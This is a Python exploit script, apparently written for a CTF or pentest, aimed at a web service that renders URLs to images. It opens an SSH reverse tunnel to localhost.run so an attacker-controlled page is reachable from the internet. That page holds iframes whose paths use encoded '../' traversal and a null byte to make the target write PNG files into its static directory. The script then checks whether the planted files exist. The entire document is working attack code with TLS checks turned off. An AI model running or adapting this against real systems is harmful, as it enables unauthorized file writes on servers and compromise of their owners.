import http.server,threading,subprocess,re,time,os,ssl,urllib.request,urllib.parse,urllib.error
TARGET=os.environ['TARGET'].rstrip('/');PORT=8765;ORIGIN=''
DEPTHS=range(1,7)
class H(http.server.BaseHTTPRequestHandler):
 def log_message(self,fmt,*args): print('HTTPLOG',fmt%args,flush=True)
 def sendb(self,b,ct='text/html; charset=utf-8'):
  self.send_response(200);self.send_header('Content-Type',ct);self.send_header('Content-Length',str(len(b)));self.send_header('Cache-Control','no-store');self.end_headers();self.wfile.write(b)
 def do_GET(self):
  global ORIGIN
  print('GETPATH',repr(self.path),flush=True)
  if urllib.parse.urlsplit(self.path).path=='/outer':
   frames=[]
   for d in DEPTHS:
    trav='/'+'/'.join(['%2e%2e']*d)+f'/app/app/static/dfo_depth_{d}.png%00x'
    frames.append(f'<iframe width=686 height=175 src="{ORIGIN+trav}"></iframe>')
   b=('<!doctype html><style>html,body{margin:0}iframe{display:block;border:0;width:686px;height:175px}</style>'+''.join(frames)).encode();return self.sendb(b)
  # Distinct but simple content to be rasterized into each candidate cache target.
  m=re.search(r'dfo_depth_(\d+)',self.path)
  tag=m.group(1) if m else 'X'
  return self.sendb((f'<!doctype html><style>html,body{{margin:0;width:686px;height:175px;background:white}}h1{{font:48px monospace}}</style><h1>DEPTH_{tag}_OK</h1>').encode())
ctx=ssl.create_default_context();ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
def get(u,t=20):
 try:
  with opener.open(urllib.request.Request(u,headers={'User-Agent':'DFO-DEPTH'}),timeout=t) as r:return r.status,dict(r.headers),r.read()
 except urllib.error.HTTPError as e:return e.code,dict(e.headers),e.read()
srv=http.server.ThreadingHTTPServer(('127.0.0.1',PORT),H);threading.Thread(target=srv.serve_forever,daemon=True).start()
ssh=subprocess.Popen(['ssh','-o','StrictHostKeyChecking=no','-o','UserKnownHostsFile=/dev/null','-o','ServerAliveInterval=15','-o','ExitOnForwardFailure=yes','-R',f'80:localhost:{PORT}','nokey@localhost.run'],stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=True,bufsize=1)
deadline=time.time()+30
while time.time()<deadline:
 line=ssh.stdout.readline()
 if line:
  print('SSH',line.rstrip(),flush=True);m=re.search(r'https://[A-Za-z0-9]+\.lhr\.life',line)
  if m:ORIGIN=m.group();break
if not ORIGIN:raise SystemExit('NO_TUNNEL')
print('ORIGIN',ORIGIN,flush=True)
for i in range(20):
 st,h,b=get(ORIGIN+'/ready',10);print('READY',i+1,st,len(b),flush=True)
 if st==200:break
 time.sleep(1)
# One paid generation for all depth candidates.
data=urllib.parse.urlencode({'url':ORIGIN+'/outer?x='+str(time.time_ns())}).encode();req=urllib.request.Request(TARGET+'/convert',data=data,headers={'Content-Type':'application/x-www-form-urlencoded','User-Agent':'DFO-DEPTH'})
try:
 with opener.open(req,timeout=80) as r:body=r.read();print('CONVERT',r.status,len(body),flush=True)
except urllib.error.HTTPError as e:body=e.read();print('CONVERT_ERR',e.code,len(body),repr(body[:1000]),flush=True)
# Check externally visible static targets.
for d in DEPTHS:
 st,h,b=get(TARGET+f'/static/dfo_depth_{d}.png?x='+str(time.time_ns()),15)
 print('CHECK',d,'status',st,'bytes',len(b),'ct',h.get('Content-Type'),'sig',repr(b[:16]),flush=True)
 if st==200 and b.startswith(b'\x89PNG'):
  print('FOUND_DEPTH='+str(d),flush=True)
